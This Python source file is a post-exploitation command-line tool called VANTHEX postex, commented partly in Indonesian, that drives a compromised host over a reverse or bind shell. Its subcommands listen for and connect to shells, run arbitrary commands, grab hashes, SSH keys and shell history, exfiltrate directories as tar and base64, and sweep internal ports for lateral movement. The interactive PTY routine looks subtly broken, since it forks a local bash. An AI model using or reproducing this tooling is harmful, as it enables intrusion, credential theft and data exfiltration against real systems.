#!/usr/bin/env python3
"""
postex.py v1 — Post-Exploitation CLI untuk VANTHEX. AUTHORIZED TESTING ONLY.

Otomasi setelah shell target berhasil terhubung:
1. Enum — info dasar host, jaringan, user, service
2. Transfer file — upload/download via base64
3. Perintah bebas — eksekusi shell command pada target
4. Shell interaktif — PTY penuh (jika terminal tersedia)

Pakai: python3 postex.py <subcommand> [options]

Tanpa arg: tampilkan bantuan.
"""
import argparse
import atexit
import base64
import os
import subprocess
import sys
import threading
import time

# import dari modul VANTHEX jika tersedia; standalone jika tidak
try:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from shellhandler import ShellHandler, HandlerError
except ImportError:
    from .shellhandler import ShellHandler, HandlerError


def _die(msg):
    sys.stderr.write(f"[postex] ERROR: {msg}\n")
    sys.exit(1)


def _log(d):
    ev = d.get("event", "")
    if ev == "listen":
        print(f"  [+] Listening on {d['where']}")
    elif ev == "accept":
        print(f"  [+] Shell connected from {d['peer']}")
    elif ev == "connect":
        print(f"  [+] Connected to {d['peer']}")
    elif d.get("dir") == "tx":
        print(f"  [→] {d['data']}")


# ------------------------------------------------------------ listen
def cmd_listen(ns):
    h = ShellHandler(host=ns.listen_host, port=ns.port, mode="reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    h.start()
    print(f"[postex] Reverse listener active on {ns.listen_host}:{ns.port}")
    print(f"[postex] Waiting for connection... (Ctrl-C to cancel)")
    if h.wait_for_connection(timeout=ns.timeout):
        print(f"[postex] Incoming connection! Shell ready.")
        if ns.interactive:
            _interactive(h)
        else:
            _repl(h)
    else:
        _die("timeout — no incoming connection")


# ------------------------------------------------------------ connect
def cmd_connect(ns):
    h = ShellHandler(host=ns.target, port=ns.port, mode="bind")
    atexit.register(h.stop)
    h.on_log(_log)
    try:
        h.start()
    except HandlerError as e:
        _die(str(e))
    print(f"[postex] Connected to {ns.target}:{ns.port}")
    if ns.interactive:
        _interactive(h)
    else:
        _repl(h)


# ------------------------------------------------------------ enum
def cmd_enum(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        print(f"[postex] Waiting for connection... (timeout {ns.timeout}s)")
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    print("[postex] Running enumeration...")
    info = h.enum()
    for k, v in info.items():
        print(f"\n{'='*50}")
        print(f"  {k.upper()}")
        print(f"{'='*50}")
        print(v)
    if ns.output:
        import json
        with open(ns.output, "w") as f:
            json.dump({"enum": info, "target": ns.connect_host or ns.listen_host,
                       "port": ns.port}, f, indent=2)
        print(f"\n[+] Results saved to {ns.output}")


# ------------------------------------------------------------ exec
def cmd_exec(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    out = h.command(ns.command, timeout=ns.timeout)
    print(out, end="")


# ------------------------------------------------------------ upload
def cmd_upload(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    size = h.send_file(ns.local, ns.remote)
    print(f"[+] File '{ns.local}' ({size} bytes) uploaded to '{ns.remote}'")


# ------------------------------------------------------------ download
def cmd_download(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    size = h.recv_file(ns.remote, ns.local, timeout=ns.timeout)
    print(f"[+] File '{ns.remote}' ({size} bytes) downloaded to '{ns.local}'")


# ------------------------------------------------------------ grab
def cmd_grab(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    print("[postex] Grabbing sensitive material...")
    data = h.grab(target_dirs=ns.dir)
    for k, v in data.items():
        print(f"\n{'='*46}\n  {k.upper()}\n{'='*46}")
        print(v)
    if ns.output:
        import json
        entries = {k: v for k, v in data.items() if v and "err" not in v}
        with open(ns.output, "w") as f:
            json.dump(entries, f, indent=2)
        print(f"\n[+] Non-empty results saved to {ns.output}")


# ------------------------------------------------------------ exfil
def cmd_exfil(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    size = h.exfil(ns.remote, ns.local, timeout=ns.timeout)
    print(f"[+] Exfil '{ns.remote}' ({size} byte) -> '{ns.local}'")


# ------------------------------------------------------------ sweep
def cmd_sweep(ns):
    h = ShellHandler(host=ns.connect_host or ns.listen_host,
                     port=ns.port, mode="bind" if ns.connect_host else "reverse")
    atexit.register(h.stop)
    h.on_log(_log)
    if ns.connect_host:
        h.start()
    else:
        h.start()
        if not h.wait_for_connection(timeout=ns.timeout):
            _die("timeout")
    ports = [int(x) for x in ns.ports.split(",") if x.strip()]
    print(f"[postex] Sweep {ns.host}:{','.join(map(str, ports))} via target shell...")
    res = h.sweep(host=ns.host, ports=ports, timeout=ns.timeout)
    if "error" in res:
        print(f"[!] {res['error']}")
        return
    print(f"[+] Open ports on {ns.host}:")
    if res["ports"]:
        for p in res["ports"]:
            print(f"    {p}/tcp")
    else:
        print("    (nothing open / probes blocked)")
    print("\n[tail]   ", res["raw"][:300])


# ------------------------------------------------------------ REPL
def _repl(h):
    print("[postex] REPL — type 'exit' to quit, 'enum' to run enumeration")
    while True:
        try:
            cmd = input("postex$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        if cmd in ("exit", "quit", "q"):
            break
        if cmd == "enum":
            info = h.enum()
            for k, v in info.items():
                print(f"\n=== {k.upper()} ===")
                print(v)
            continue
        try:
            out = h.command(cmd, timeout=30)
            print(out, end="")
        except HandlerError as e:
            print(f"[!] {e}")


# ------------------------------------------------------------ PTY interaktif
def _interactive(h):
    """PTY interaktif penuh — butuh terminal. Fallback ke REPL jika bukan TTY."""
    if not sys.stdin.isatty():
        _repl(h)
        return
    try:
        import pty, select, termios, tty, fcntl, struct, TERMIOS
    except ImportError:
        print("[!] PTY unavailable (not Linux/Unix) — falling back to REPL")
        _repl(h)
        return

    old_settings = termios.tcgetattr(sys.stdin)
    master_fd, slave_fd = pty.openpty()
    pid = os.fork()
    if pid == 0:
        # child: jalankan shell
        os.close(master_fd)
        os.dup2(slave_fd, 0)
        os.dup2(slave_fd, 1)
        os.dup2(slave_fd, 2)
        os.close(slave_fd)
        os.execvp("bash", ["bash"])
    else:
        os.close(slave_fd)
        tty.setraw(sys.stdin)
        try:
            while True:
                r, _, _ = select.select([sys.stdin, master_fd], [], [])
                if sys.stdin in r:
                    d = os.read(sys.stdin.fileno(), 1024)
                    if not d:
                        break
                    os.write(master_fd, d)
                if master_fd in r:
                    d = os.read(master_fd, 1024)
                    if not d:
                        break
                    os.write(sys.stdout.fileno(), d)
        finally:
            termios.tcsetattr(sys.stdin, TERMIOS.TCSADRAIN, old_settings)
            os.close(master_fd)
            os.waitpid(pid, 0)


# ------------------------------------------------------------ main
def main():
    ap = argparse.ArgumentParser(
        prog="postex.py",
        description="postex v1 — Post-Exploitation CLI for VANTHEX (authorized testing only)")
    sub = ap.add_subparsers(dest="cmd", required=True)

    # --- listen
    lp = sub.add_parser("listen", help="Reverse shell listener (we bind, target connects)")
    lp.add_argument("--host", dest="listen_host", default="0.0.0.0")
    lp.add_argument("-p", "--port", dest="port", type=int, default=4444)
    lp.add_argument("-t", "--timeout", type=float, default=600)
    lp.add_argument("-i", "--interactive", action="store_true")
    lp.set_defaults(fn=cmd_listen)

    # --- connect
    cp = sub.add_parser("connect", help="Bind connector (we connect to target)")
    cp.add_argument("target", help="Target IP address")
    cp.add_argument("-p", "--port", dest="port", type=int, default=4444)
    cp.add_argument("-i", "--interactive", action="store_true")
    cp.set_defaults(fn=cmd_connect)

    # --- enum
    ep = sub.add_parser("enum", help="Automatic enumeration on active shell")
    eg = ep.add_mutually_exclusive_group(required=True)
    eg.add_argument("--connect", dest="connect_host", help="bind mode: connect to target")
    eg.add_argument("--listen", dest="listen_host", help="reverse mode: bind then wait")
    ep.add_argument("-p", "--port", dest="port", type=int, default=4444)
    ep.add_argument("-t", "--timeout", type=float, default=600)
    ep.add_argument("-o", "--output", dest="output", help="Save JSON results")
    ep.set_defaults(fn=cmd_enum)

    # --- exec
    xp = sub.add_parser("exec", help="Run a single command on active shell")
    eg = xp.add_mutually_exclusive_group(required=True)
    eg.add_argument("--connect", dest="connect_host", help="bind mode: connect to target")
    eg.add_argument("--listen", dest="listen_host", help="reverse mode: bind then wait")
    xp.add_argument("-p", "--port", dest="port", type=int, default=4444)
    xp.add_argument("-t", "--timeout", type=float, default=30)
    xp.add_argument("command", help="Shell command to run on target")
    xp.set_defaults(fn=cmd_exec)

    # --- upload
    up = sub.add_parser("upload", help="Upload file to target")
    up.add_argument("local", help="Local file")
    up.add_argument("remote", help="Path on target")
    ug = up.add_mutually_exclusive_group(required=True)
    ug.add_argument("--connect", dest="connect_host", help="bind mode")
    ug.add_argument("--listen", dest="listen_host", help="reverse mode")
    up.add_argument("-p", "--port", dest="port", type=int, default=4444)
    up.add_argument("-t", "--timeout", type=float, default=600)
    up.set_defaults(fn=cmd_upload)

    # --- download
    dp = sub.add_parser("download", help="Download file from target")
    dp.add_argument("remote", help="Path on target")
    dp.add_argument("local", help="Resulting local file")
    dg = dp.add_mutually_exclusive_group(required=True)
    dg.add_argument("--connect", dest="connect_host", help="bind mode")
    dg.add_argument("--listen", dest="listen_host", help="reverse mode")
    dp.add_argument("-p", "--port", dest="port", type=int, default=4444)
    dp.add_argument("-t", "--timeout", type=float, default=600)
    dp.set_defaults(fn=cmd_download)

    # --- grab
    gp = sub.add_parser("grab", help="Grab sensitive material (hash/ssh/history/cfg)")
    gg = gp.add_mutually_exclusive_group(required=True)
    gg.add_argument("--connect", dest="connect_host", help="bind mode")
    gg.add_argument("--listen", dest="listen_host", help="reverse mode")
    gp.add_argument("-p", "--port", dest="port", type=int, default=4444)
    gp.add_argument("-t", "--timeout", type=float, default=600)
    gp.add_argument("--dir", action="append", dest="dir", default=None,
                    help="Extra config directories (repeatable)")
    gp.add_argument("-o", "--output", dest="output", help="Save non-empty JSON results")
    gp.set_defaults(fn=cmd_grab)

    # --- exfil
    xf = sub.add_parser("exfil", help="Tar+base64 download path from target")
    xf.add_argument("remote", help="Path on target (file/directory)")
    xf.add_argument("local", help="Resulting local file")
    xg = xf.add_mutually_exclusive_group(required=True)
    xg.add_argument("--connect", dest="connect_host", help="bind mode")
    xg.add_argument("--listen", dest="listen_host", help="reverse mode")
    xf.add_argument("-p", "--port", dest="port", type=int, default=4444)
    xf.add_argument("-t", "--timeout", type=float, default=600)
    xf.set_defaults(fn=cmd_exfil)

    # --- sweep
    sp = sub.add_parser("sweep", help="Sweep internal ports from target shell (lateral recon)")
    sg = sp.add_mutually_exclusive_group(required=True)
    sg.add_argument("--connect", dest="connect_host", help="bind mode")
    sg.add_argument("--listen", dest="listen_host", help="reverse mode")
    sp.add_argument("--host", default="127.0.0.1", help="Host/subsystem to sweep")
    sp.add_argument("-p", "--port", dest="port", type=int, default=4444,
                    help="Shell connection port (handler)")
    sp.add_argument("-P", "--ports", default="22,80,443,3306,5432,6379,8080,8443,9200,3000,5000",
                    help="Comma-separated target port list")
    sp.add_argument("-t", "--timeout", type=float, default=120)
    sp.set_defaults(fn=cmd_sweep)

    ns = ap.parse_args()
    ns.fn(ns)


if __name__ == "__main__":
    main()